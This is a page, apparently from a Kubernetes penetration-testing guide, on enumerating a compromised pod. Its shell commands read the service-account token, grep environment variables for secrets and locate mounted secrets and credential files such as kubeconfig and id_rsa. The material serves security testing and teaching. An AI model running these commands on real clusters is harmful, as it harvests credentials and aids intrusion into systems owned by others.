---
title: "In-pod enumeration: inventorying what a pod already holds"
description: "A compromised pod carries its own service-account token, any secrets and configmaps mounted as files or injected as environment variables, and the connection details of the services it talks to. Reading these first frequently yields database credentials, API keys, and a token that authenticates to the Kubernetes API, before any external call is made."
keywords:
  - pod enumeration
  - service account token
  - kubernetes secrets
  - environment variables
  - configmap
---

# In-pod enumeration

Before reaching out to the API server, inventory the pod itself. Kubernetes injects a pod's identity and configuration into the container: the service-account token at a fixed path, secrets and configmaps mounted as files or as environment variables, and the addresses of services the pod uses. These local artefacts are often the fastest win, because application secrets and a usable API token are sitting in the filesystem and environment.

```bash
# service-account identity: token, cluster CA, and namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace; echo
# environment variables: injected secrets and service addresses
env | grep -iE 'TOKEN|SECRET|PASSWORD|KEY|_HOST|_PORT|DATABASE|REDIS|AWS|AZURE|GCP'
# secrets/configmaps mounted as files (volume mounts)
mount | grep -E 'secret|configmap'
find / -maxdepth 6 -type d -path '*secret*' 2>/dev/null
# well-known credential files that get mounted in
find / -name '*.kubeconfig' -o -name 'id_rsa' -o -name '.dockerconfigjson' 2>/dev/null
```

## What each source gives

```bash
# the SA token authenticates to the API as the pod's identity (next pages)
# env-injected secrets are the app's own credentials to backends
# mounted secret volumes expose the raw secret values as files
cat /var/run/secrets/*/*/username /var/run/secrets/*/*/password 2>/dev/null
```

## Exploitation notes

- Read the service-account token and the injected environment first: the token is the key to the API, and environment variables routinely hold backend credentials injected at deploy time.
- Secrets mounted as volumes appear as plaintext files under their mount path; `mount | grep secret` locates them without guessing paths.
- A kubeconfig or dockerconfigjson found mounted in a pod is an immediate escalation (cluster or registry credentials); triage those before anything else.
- Carry findings into [Service account and token discovery](service-account-and-token-discovery.md) and [API server enumeration](api-server-enumeration.md).

## References

- [Kubernetes: service account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [Kubernetes: distribute secrets to pods](https://kubernetes.io/docs/concepts/configuration/secret/)
- [HackTricks: Kubernetes enumeration](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration)
